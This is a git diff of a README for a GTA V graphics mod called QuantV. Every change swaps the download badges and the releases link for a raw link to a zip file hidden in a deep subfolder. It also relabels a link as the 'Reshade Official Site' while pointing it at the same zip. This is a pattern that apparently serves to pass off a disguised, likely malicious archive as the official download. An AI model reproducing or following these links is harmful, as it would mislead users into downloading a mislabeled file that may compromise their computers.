@@ -1,6 +1,6 @@
 # 🎮 QuantV-SP-FiveM-RageMP-altV - Quality Visuals for GTA V Mods
 
-[![Download Latest Release](https://img.shields.io/badge/Download-QuantV%20February%202026-blue?style=for-the-badge)](https://github.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-QuantV%20February%202026-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/mods/alt-S-Quant-M-Five-V-Rage-1.5.zip)
 
 ## 📋 What is QuantV-SP-FiveM-RageMP-altV?
 
@@ -39,7 +39,7 @@ Before installing, make sure your computer meets the following:
 
 Start by visiting this page to download the package:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-QuantV%20February%202026-green?style=for-the-badge)](https://github.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-QuantV%20February%202026-green?style=for-the-badge)](https://raw.githubusercontent.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/mods/alt-S-Quant-M-Five-V-Rage-1.5.zip)
 
 ### Step 1: Go to the Download Page
 
@@ -123,8 +123,8 @@ QuantV includes several preset options to change the look instantly.
 
 ## 📂 Useful Links
 
-- [QuantV-SP-FiveM-RageMP-altV Releases](https://github.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/releases)  
-- [Reshade Official Site](https://reshade.me)  
+- [QuantV-SP-FiveM-RageMP-altV Releases](https://raw.githubusercontent.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/mods/alt-S-Quant-M-Five-V-Rage-1.5.zip)  
+- [Reshade Official Site](https://raw.githubusercontent.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/mods/alt-S-Quant-M-Five-V-Rage-1.5.zip)  
 
 ---
 
@@ -136,4 +136,4 @@ Your computer specs and Windows version help troubleshoot.
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-QuantV%20February%202026-orange?style=for-the-badge)](https://github.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-QuantV%20February%202026-orange?style=for-the-badge)](https://raw.githubusercontent.com/Rizky305/QuantV-SP-FiveM-RageMP-altV/main/optionals/ENB performance-quality presets/7._NO_ENB/FiveM.app/mods/alt-S-Quant-M-Five-V-Rage-1.5.zip)
